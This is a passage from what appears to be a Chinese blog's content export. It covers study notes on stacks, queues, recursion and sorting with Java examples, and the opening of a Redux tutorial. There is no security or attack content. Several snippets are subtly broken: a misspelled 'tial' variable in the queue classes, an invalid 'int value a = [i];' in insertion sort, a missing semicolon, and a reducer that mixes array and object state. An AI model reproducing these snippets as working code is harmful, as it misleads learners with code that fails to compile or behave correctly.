class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayStack</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> String[] items; <span class="comment">// 数组</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> count;      <span class="comment">// 栈中元素个数</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> n;          <span class="comment">// 栈的大小</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化数组，申请一个大小为n的数组空间</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ArrayStack</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.items = <span class="keyword">new</span> String[n];</span><br><span class="line">    <span class="keyword">this</span>.n = n;</span><br><span class="line">    <span class="keyword">this</span>.count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 入栈操作</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">push</span><span class="params">(String item)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (count == n) <span class="keyword">return</span> <span class="keyword">false</span>;  <span class="comment">// 数组空间不够了，入栈失败，返回false</span></span><br><span class="line">    items[count] = item;</span><br><span class="line">    ++count;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 出栈操作</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// 返回下标为count - 1 的数组元素，并且栈中元素个数count-1</span></span><br><span class="line">    String tmp = items[count - <span class="number">1</span>];</span><br><span class="line">    --count;</span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><ul><li>函数调用栈</li></ul><p>我们知道，操作系统给每个线程分配了一块独立的内存空间，这块内存被组织成“栈”，用来储存函数调用时的临时变量。每进入一个函数，就会将临时变量作为一个栈帧入栈，当被调用函数执行完成，返回之后，将这个函数对应的栈帧出栈。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">  ret = add(<span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line">  res = a + ret;</span><br><span class="line">  printf(<span class="string">"%d"</span>, res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">  sum = x + y;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/03/14/数据结构与算法/6.jpg" style="max-width: 400px"></p><p><br></p><ul><li>表达式求值<code>3+5/*8-6</code></li></ul><p>编译器通过两个栈实现。其中一个保存操作数的栈，另一个保存运算符的栈。我们从左向右遍历表达式，当遇到数字，压入操作数栈；当遇到运算符，就与运算符栈的栈顶元素进行比较。如果比运算符栈顶元素的优先级高，就压入栈。如果比栈顶元素优先级低或者相同，从运算符栈中取栈顶运算符，从操作数栈的栈顶取2个操作数，进行计算，再把计算完的结果压入操作数栈。继续比较。<br><img src="/2019/03/14/数据结构与算法/7.jpg" style="max-width: 700px"></p><ul><li>检查表达式中的括号是否匹配</li></ul><p>表达式中包括三种括号<code>() {} []</code>，<code>{[{}]}, [{()}([])]</code>等都为合法格式，而<code>{[}()], [({)]</code>为不合法合适。如何检查它是否合法？</p><p>从左到右扫描字符串，当扫描到左括号时，将其压入栈中；当扫描到有右括号时，从栈顶取出一个左括号。如果能够匹配，则继续扫描剩下的字符串。如果不能匹配，或栈中没有数据，则说明为非法格式。</p><p><br></p><ul><li><strong>实现浏览器前进后退功能</strong></li></ul><p>当你依次访问完一串页面a-b-c之后，点击浏览器的后退按钮，就可以看到b和a。当你后退到a，点击前进，就可以重新查看b和c。但是，如果你后退到b后，点击了新的页面d，就无法通过前进、后退功能查看c了。</p><p>当你顺序看了a,b,c三个页面，依次把a,b,c压入栈X。通过浏览器的后退按钮，从页面c退到页面a，我们依次把c,b从栈X中弹出，并且依次放入栈Y。<br><img src="/2019/03/14/数据结构与算法/8.jpg" style="max-width: 500px"></p><p>这时，你在b页面上跳转到新页面d，页面c就无法再通过前进、后退按钮重复查看了，所以清空栈Y。<br><img src="/2019/03/14/数据结构与算法/9.jpg" style="max-width: 500px"></p><p><br><br><br></p><h3 id="4-队列"><a href="#4-队列" class="headerlink" title="4. 队列"></a>4. 队列</h3><p>先进者新出，和栈相似，队列有两个基本操作：入队，放一个数据到队列尾部；出队，从队列头部取一个元素。</p><p><br></p><ul><li><em>用数组实现队列</em></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayQueue</span></span>&#123;</span><br><span class="line">  <span class="comment">// 数组 items, 数组大小 n</span></span><br><span class="line">  <span class="keyword">private</span> String[] items;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// head 表示队头下标; tail 表示队尾下标</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> head = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> tail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 申请一个大小为capacity的数组</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ArrayQueue</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">    items = <span class="keyword">new</span> String[capacity];</span><br><span class="line">    n = capacity;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 入队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(String item)</span></span>&#123;</span><br><span class="line">    <span class="comment">// tail == n 表示队列末尾没有空间了</span></span><br><span class="line">    <span class="keyword">if</span> (tail == n) &#123;</span><br><span class="line">      <span class="comment">// tail == n &amp;&amp; head == 0 表示整个队列占满了</span></span><br><span class="line">      <span class="keyword">if</span> (head == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      <span class="comment">// 数据搬移</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = head; i &lt; tail; i++)&#123;</span><br><span class="line">        items[i-head] = items[i]</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="comment">// 数据搬移后重新更新head和tail</span></span><br><span class="line">      tail -= head;</span><br><span class="line">      head = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    items[tail] = item;</span><br><span class="line">    ++tail;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 出队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">dequeue</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// head == tail 表示队列为空</span></span><br><span class="line">    <span class="keyword">if</span> (head == tial) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    String ret = items[head];</span><br><span class="line">    ++head;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于栈来说，我们只需要一个<strong>栈顶指针</strong>。但是队列需要两个指针：一个是head指针，指向队头；一个是tail指针，指向队尾。<br><img src="/2019/03/14/数据结构与算法/10.jpg" style="max-width: 600px"></p><p><br></p><ul><li><em>循环队列：避免数据搬移</em></li></ul><p>队满时，<code>(tail+1)%n=head</code>。可以发现，队满时，图中的tail指向的位置实际上是没有存储数据的。所以，循环队列会浪费一个存储空间。<br><img src="/2019/03/14/数据结构与算法/11.jpg" style="max-width: 600px"><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CircularQueue</span></span>&#123;</span><br><span class="line">  <span class="comment">// 数组 items, 数组大小 n</span></span><br><span class="line">  <span class="keyword">private</span> String[] items;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> head = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> tail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 申请一个大小为capacity的数组</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">CircularQueue</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">    items = <span class="keyword">new</span> String[capacity];</span><br><span class="line">    n = capacity;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 入队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(String item)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 队列满了</span></span><br><span class="line">    <span class="keyword">if</span> ((tail + <span class="number">1</span>) % n == head) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    items[tail] = item;</span><br><span class="line">    tial = (tial + <span class="number">1</span>) % n;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>; </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 出队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">dequeue</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 如果 head == tial 表示队列为空</span></span><br><span class="line">    <span class="keyword">if</span> (head == tail) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    String ret = items[head];</span><br><span class="line">    head = (head + <span class="number">1</span>) % n;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>阻塞队列： 生产者-消费者模型<br>当队列为空的时候，因为没有数据可取，从队头取数据会被阻塞。当队列已经满了，插入数据的操作就会被阻塞，知道队列中有空闲位置后才能插入数据。</li></ul><p><br><br><br></p><h3 id="5-递归"><a href="#5-递归" class="headerlink" title="5. 递归"></a>5. 递归</h3><p>递归就是用栈的数据结构，加上一个简单的逻辑算法实现了业务功能。所有的递归问题都可以用递推公式来表示。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f(n) = f(n - 1) + 1; 其中f(1) = 1;</span><br></pre></td></tr></table></figure></p><p>f(n)表示你想知道自己在哪一排，f(n-1)表示前面一排的排数，f(1)=1表示第一排的人知道自己在第一排。有了这个递推公式，我们可以得到递归代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> f(n-<span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><ul><li><em>写出递推公式，找到终止条件</em></li></ul><p>假设有n个台阶，每次你可以跨1或2个台阶，问走这n个台阶共有多种种走法？实际上，可以根据第一步的走法把所有走法分为两类，一类是先走1阶后，n-1个台阶的走法 + 先走2阶后，n-2个台阶的走法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f(n) = f(n-1) + f(n-2)</span><br></pre></td></tr></table></figure></p><p>当有1个台阶且走1阶，或有2个台阶走2阶时，即f(1) = 1, f(2) = 2，就不需要再递归。最终的递归代码是这样的：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> f(n-<span class="number">1</span>) + f(n-<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><ul><li><p>警惕栈堆溢出<br>每调用一个函数，都会将临时变量封装为栈帧压入内存栈，等函数执行完成返回时，才出栈。如果递归求解的数据规模很大，调用层次很深，一直压入栈，就会有堆栈溢出的风险（需要考虑这部分的空间开销）。可以限制递归调用的最大深度来解决这个问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> depth = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  ++depth;</span><br><span class="line">  <span class="keyword">if</span>(depth &gt; <span class="number">10000</span>) <span class="keyword">throw</span> exception;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> f(n-<span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>警惕重复计算<br>从图中，我们可以直观地看到，想要计算f(5)，需先计算f(4)和f(3)。计算f(4)还要计算f(3)。因此，f(3)被计算了很多次。我们可以通过一个散列表来保存已经求解过的f(k)。当递归调用f(k)，如果已经求解过，可以直接从散列表中取值返回。<br><img src="/2019/03/14/数据结构与算法/12.jpg" style="max-width: 500px"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (hasSolvedList.containKey(n))&#123;</span><br><span class="line">    <span class="keyword">return</span> hasSolvedList.get(n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> ret = f(n-<span class="number">1</span>) + f(n-<span class="number">2</span>);</span><br><span class="line">  hasSolvedList.put(n, ret);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>无限递归<br>比如demo环境下数据库中，测试工程师为了方便测试，会人为地插入一些数据，就会出现脏数据，出现A-B-C-A这样的死循环。可以用限制递归深度解决，也可以自动检测A-B-C-A（用散列表记录已经查过的数据）。</p></li></ul><p><br><br><br></p><h3 id="6-排序"><a href="#6-排序" class="headerlink" title="6. 排序"></a>6. 排序</h3><p>原地排序：空间复杂度为O(1)的算法<br>稳定排序：相同的元素在排序后保持原有的顺序不变<br>有序度: 接近有序/完全无序。<br><em>有序度</em>是数组中具有有序关系的元素对的个数。</p><p><br></p><h4 id="6-1-冒泡排序"><a href="#6-1-冒泡排序" class="headerlink" title="6.1 冒泡排序"></a>6.1 冒泡排序</h4><p>对一组数组4,5,6,3,2,1从小到大进行排序。<br><img src="/2019/03/14/数据结构与算法/13.jpg" style="max-width: 500px"></p><p>冒泡排序只会操作相邻的两个数据。每次冒泡操作都会比较相邻的两个元素，看要不要让它们互换位置。一次冒泡会让至少一个元素移动到它应该的位置，重复n次，就完成了n个数据的排序工作。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 冒泡排序，a表示数组，n表示数组大小</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">    <span class="comment">// 提前退出冒泡循环的标志位</span></span><br><span class="line">    <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; ++j)&#123;</span><br><span class="line">      <span class="keyword">if</span> (a[j] &gt; a[j+<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = a[j];</span><br><span class="line">        a[j] = a[j+<span class="number">1</span>];</span><br><span class="line">        a[j+<span class="number">1</span>] = tmp;</span><br><span class="line">        flag = <span class="keyword">true</span>; <span class="comment">// 表示有数据交换</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!flag) <span class="keyword">break</span>;  <span class="comment">// 没有数据交换，提前退出</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>冒泡排序是原地排序算法，是稳定的排序算法，最好情况时间复杂度是O(n)，最坏情况时间复杂度是O(n²)</p><p><br></p><h4 id="6-2-插入排序"><a href="#6-2-插入排序" class="headerlink" title="6.2 插入排序"></a>6.2 插入排序</h4><p>插入排序将数组中的数据分为两个区间，<strong>已排序区间</strong>和<strong>未排序区间</strong>。初始已排序区间只有一个元素，就是数组的第一个元素。然后取未排序区间中的元素，在已排序区间中找到合适的位置插入，并保证已排序区间数据一直有序。<br><img src="/2019/03/14/数据结构与算法/14.jpg" style="max-width: 500px"><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 插入排序，a表示数组，n表示数组大小</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insertionSort</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i)&#123;</span><br><span class="line">    <span class="comment">// value 要插入的元素</span></span><br><span class="line">    <span class="keyword">int</span> value a = [i];</span><br><span class="line">    <span class="keyword">int</span> j = i - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 查找插入的位置</span></span><br><span class="line">    <span class="keyword">for</span>(; j &gt;= <span class="number">0</span>; --j)&#123;</span><br><span class="line">      <span class="keyword">if</span> (a[j] &gt; value)&#123;</span><br><span class="line">        a[j+<span class="number">1</span>] = a[j];  <span class="comment">// 已排序区间中比value大的元素均往后移一格</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    a[j+<span class="number">1</span>] = value; <span class="comment">// 插入数据</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>插入排序是原地排序算法，是稳定的排序算法，最好情况时间复杂度是O(n)，最坏情况时间复杂度是O(n²)</p><p><br></p><h4 id="6-3-选择排序"><a href="#6-3-选择排序" class="headerlink" title="6.3 选择排序"></a>6.3 选择排序</h4><p>选择排序每会从末排序区间中找到最小的元素，将其放到已排序区间的末尾。<br><img src="/2019/03/14/数据结构与算法/15.jpg" style="max-width: 500px"><br>选择排序是原地排序算法，是一种不稳定的排序算法，最好情况事件复杂度和最坏情况时间复杂度都是O(n²)</p><p><br></p><h4 id="6-4-归并排序"><a href="#6-4-归并排序" class="headerlink" title="6.4 归并排序"></a>6.4 归并排序</h4><p>先把数组从中间分成前后两部分，然后对前后两部分分别排序，再将排好序的两部分合并在一起，这样整个数组就有序了。<br><img src="/2019/03/14/数据结构与算法/16.jpg" style="max-width: 500px"></p><h4 id="6-5-快速排序"><a href="#6-5-快速排序" class="headerlink" title="6.5 快速排序"></a>6.5 快速排序</h4>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Redux</title>
      <link href="/2019/02/28/Redux/"/>
      <url>/2019/02/28/Redux/</url>
      <content type="html"><![CDATA[<blockquote><p>应用中所有的state都以一个对象树的形式储存在一个单一的store中。唯一修改state的办法就是触发action，有一个描述发生什么的对象。为了描述action如何改变state树，你需要编写reducers。</p></blockquote><p><br></p><h3 id="1-核心概念"><a href="#1-核心概念" class="headerlink" title="1. 核心概念"></a>1. 核心概念</h3><ul><li>Store : 一个纯js对象，描述应用的state</li><li><p>Action :一个普通Javascript对象，用来描述发生了什么</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">type</span>: <span class="string">'ADD_TODO'</span>, <span class="attr">text</span>: <span class="string">'Build your data'</span> &#125;</span><br><span class="line">&#123; <span class="attr">type</span>: <span class="string">'TOGGLE_TODO'</span>, <span class="attr">index</span>: <span class="number">1</span> &#125;</span><br></pre></td></tr></table></figure></li><li><p>Reducer : 是一个接收state和action, 并返回新的state的纯函数。保持reducer纯净很重要，永远不要在reducer里做这些操作: ① 修改传入参数; ② 执行有副作用的操作，如API请求和路由跳转；③ 调用非纯函数，如<code>Date.now()</code>或<code>Math.random()</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">todo</span>(<span class="params">state=[], action</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'ADD_TODO'</span>:</span><br><span class="line">      <span class="comment">// 不能使用Object.assign(state, &#123;...&#125;)，因为它会改变第一个参数的值</span></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Object</span>.assign(&#123;&#125;, state, &#123;</span><br><span class="line">        todos: [</span><br><span class="line">          ...state.todos,</span><br><span class="line">          &#123;</span><br><span class="line">            text: action.text,</span><br><span class="line">            completed: <span class="literal">false</span>,</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'TOGGLE_TODO'</span>:</span><br><span class="line">      <span class="comment">// 形成一个新的数组</span></span><br><span class="line">      <span class="keyword">return</span> state.map(</span><br><span class="line">        (item, index) =&gt; </span><br><span class="line">          action.index == index ? &#123; <span class="attr">text</span>: item.text, <span class="attr">completed</span>: !item.completed &#125; : item</span><br><span class="line">      )</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-三个原则"><a href="#2-三个原则" class="headerlink" title="2. 三个原则"></a>2. 三个原则</h3><ul><li>单一数据源<br><em><code>state -&gt; DOM ; store -&gt; APP</code></em><br>全局只有一个唯一的store, 所有的组件状态都可以放在外部store中。所有节点的更新都通过Store完成。组件之间的通信不再依赖组件的层级结构。<br><img src="/2019/02/28/Redux/1.png" style="max-width: 500px"></li></ul><p><br></p><ul><li>state是只读的<br><em><code>(state, action) =&gt; new state</code></em><br>唯一改变state的方法就是触发action。视图和网络请求都不能直接修改state。点击按钮后，会形成一个action，这个action会被dispatche到Reducer。Reducer处理这个action，返回一个新的store。store的变化，会触发UI的变化。<br><img src="/2019/02/28/Redux/2.png" style="max-width: 400px"><br><br></li></ul><ul><li>使用纯函数来执行修改<br>更新store的reducer是一个纯函数，输出结果由参数决定。</li></ul><p><br></p><h3 id="3-Redux-API"><a href="#3-Redux-API" class="headerlink" title="3. Redux API"></a>3. Redux API</h3><p><em>createStore(reducer)</em><br>创建store<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createStore &#125; <span class="keyword">from</span> <span class="string">'redux'</span>;</span><br><span class="line"><span class="keyword">import</span> todoApp <span class="keyword">from</span> <span 